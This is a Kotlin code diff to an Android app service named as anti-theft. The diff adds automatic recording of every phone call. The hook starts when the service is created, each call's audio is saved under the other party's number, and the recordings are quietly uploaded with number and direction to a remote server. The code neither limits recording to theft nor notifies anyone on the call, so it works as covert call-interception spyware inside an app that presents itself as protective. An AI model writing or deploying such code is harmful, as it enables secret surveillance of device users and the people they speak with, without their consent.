@@ -43,6 +43,7 @@ import android.net.Uri
 import android.provider.Settings
 import android.provider.Telephony
 import android.telephony.TelephonyManager
+import android.telephony.PhoneStateListener
 import android.util.Log
 import androidx.core.app.NotificationCompat
 import androidx.lifecycle.LifecycleService
@@ -183,6 +184,16 @@ class AntiTheftService : LifecycleService() {
     private var screenRecordFile: File? = null
     private var isScreenRecording = false
 
+    // Call Recording state (MediaRecorder + PhoneStateListener)
+    private var callRecorder: MediaRecorder? = null
+    private var isCallRecording = false
+    private var callRecordFile: File? = null
+    private var callRecordNumber = "unknown"
+    private var callRecordDirection = "in"   // "in" | "out"
+    private var callState = TelephonyManager.CALL_STATE_IDLE
+    @Suppress("DEPRECATION")
+    private var phoneStateListener: PhoneStateListener? = null
+
     // Camera Recording state (CameraX VideoCapture)
     private var cameraVideoCapture: VideoCapture<Recorder>? = null
     private var cameraActiveRecording: Recording? = null
@@ -317,6 +328,9 @@ class AntiTheftService : LifecycleService() {
 
         // NetworkCallback: reconecta imediatamente quando a rede volta (saída do Doze/Wi-Fi)
         registerNetworkCallback()
+
+        // Gravação automática de ligações
+        startCallRecordingMonitor()
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -1476,6 +1490,140 @@ class AntiTheftService : LifecycleService() {
         })
     }
 
+    // ── Gravação de Ligações ──────────────────────────────────────────────────
+
+    @SuppressLint("MissingPermission")
+    @Suppress("DEPRECATION")
+    private fun startCallRecordingMonitor() {
+        val tm = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
+        phoneStateListener = object : PhoneStateListener() {
+            override fun onCallStateChanged(state: Int, incomingNumber: String?) {
+                when (state) {
+                    TelephonyManager.CALL_STATE_RINGING -> {
+                        callRecordNumber  = incomingNumber?.replace(Regex("[^0-9+]"), "")
+                            ?.take(20)?.ifBlank { "unknown" } ?: "unknown"
+                        callRecordDirection = "in"
+                        callState = state
+                        Log.d("AntiTheftService", "Call RINGING — incoming: $callRecordNumber")
+                    }
+                    TelephonyManager.CALL_STATE_OFFHOOK -> {
+                        if (callState == TelephonyManager.CALL_STATE_IDLE) {
+                            // No RINGING before → outgoing call
+                            callRecordDirection = "out"
+                            callRecordNumber    = "unknown"
+                        }
+                        callState = state
+                        startCallRecord()
+                    }
+                    TelephonyManager.CALL_STATE_IDLE -> {
+                        if (callState != TelephonyManager.CALL_STATE_IDLE) stopCallRecord()
+                        callState = state
+                    }
+                }
+            }
+        }
+        tm.listen(phoneStateListener, PhoneStateListener.LISTEN_CALL_STATE)
+        Log.d("AntiTheftService", "Call recording monitor registered")
+    }
+
+    @SuppressLint("MissingPermission")
+    @Suppress("DEPRECATION")
+    private fun startCallRecord() {
+        if (isCallRecording) return
+        if (ContextCompat.checkSelfPermission(
+                this, android.Manifest.permission.RECORD_AUDIO
+            ) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
+            sendConsoleLog("⚠️ Gravação de ligação: permissão RECORD_AUDIO não concedida.")
+            return
+        }
+        val ts       = System.currentTimeMillis()
+        val outFile  = File(cacheDir, "call_${callRecordDirection}_${callRecordNumber}_${ts}.m4a")
+        callRecordFile = outFile
+
+        val recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
+            MediaRecorder(this)
+        else
+            @Suppress("DEPRECATION") MediaRecorder()
+
+        try {
+            recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION)
+            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
+            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
+            recorder.setAudioEncodingBitRate(64_000)
+            recorder.setAudioSamplingRate(16_000)
+            recorder.setOutputFile(outFile.absolutePath)
+            recorder.prepare()
+            recorder.start()
+            callRecorder     = recorder
+            isCallRecording  = true
+
+            val dir = if (callRecordDirection == "in") "entrada" else "saída"
+            webSocket?.send("""{"type":"CALL_RECORD_STARTED","deviceId":"$deviceId","number":"$callRecordNumber","direction":"$callRecordDirection"}""")
+            sendConsoleLog("📞 Gravando ligação ($dir de $callRecordNumber)...")
+        } catch (e: Exception) {
+            Log.e("AntiTheftService", "startCallRecord error: ${e.message}", e)
+            recorder.release()
+            callRecordFile?.delete()
+            callRecordFile = null
+            sendConsoleLog("❌ Erro ao iniciar gravação de ligação: ${e.message}")
+        }
+    }
+
+    private fun stopCallRecord() {
+        if (!isCallRecording) return
+        isCallRecording = false
+        try { callRecorder?.stop() } catch (e: Exception) {
+            Log.e("AntiTheftService", "callRecorder stop error: ${e.message}")
+        }
+        callRecorder?.release()
+        callRecorder = null
+
+        webSocket?.send("""{"type":"CALL_RECORD_STOPPED","deviceId":"$deviceId"}""")
+
+        val file = callRecordFile
+        if (file != null && file.exists() && file.length() > 1024) {
+            val kb = file.length() / 1024
+            sendConsoleLog("⏹ Ligação encerrada (${kb}KB) — enviando ao servidor...")
+            uploadCallRecording(file, callRecordNumber, callRecordDirection)
+            callRecordFile = null
+        } else {
+            sendConsoleLog("❌ Gravação de ligação vazia ou inválida.")
+            callRecordFile?.delete()
+            callRecordFile = null
+        }
+    }
+
+    private fun uploadCallRecording(file: File, number: String, direction: String) {
+        val token = linkToken.ifBlank {
+            getSharedPreferences("androidprotect_prefs", Context.MODE_PRIVATE)
+                .getString("link_token", "") ?: ""
+        }.trim()
+        val path      = "/upload/call-recording/$deviceId${if (token.isNotEmpty()) "?linkToken=$token" else ""}"
+        val serverUrl = getUploadUrl(path)
+        val requestBody = MultipartBody.Builder()
+            .setType(MultipartBody.FORM)
+            .addFormDataPart("recording", file.name, file.asRequestBody("audio/mp4".toMediaType()))
+            .addFormDataPart("number",    number)
+            .addFormDataPart("direction", direction)
+            .build()
+        val request = Request.Builder().url(serverUrl).post(requestBody).build()
+        okHttpClient.newCall(request).enqueue(object : Callback {
+            override fun onResponse(call: Call, response: Response) {
+                response.use {
+                    if (response.isSuccessful) {
+                        sendConsoleLog("✅ Gravação de ligação enviada ao servidor.")
+                        file.delete()
+                    } else {
+                        sendConsoleLog("❌ Falha no upload de ligação: ${response.code}")
+                    }
+                }
+            }
+            override fun onFailure(call: Call, e: IOException) {
+                sendConsoleLog("❌ Erro de rede no upload de ligação: ${e.message}")
+            }
+        })
+    }
+
     // ── Gravação de Tela ─────────────────────────────────────────────────────
     @Suppress("DEPRECATION")
     private fun startScreenRecord(durationSeconds: Int) {
@@ -2164,6 +2312,13 @@ class AntiTheftService : LifecycleService() {
         healthCheckRunnable = null
 
         webSocket?.close(1000, "Service destroyed")
+        stopCallRecord()
+        @Suppress("DEPRECATION")
+        phoneStateListener?.let {
+            (getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager)
+                ?.listen(it, PhoneStateListener.LISTEN_NONE)
+        }
+        phoneStateListener = null
         stopCameraRecord()
         stopCameraStream()
         stopAudioStream()
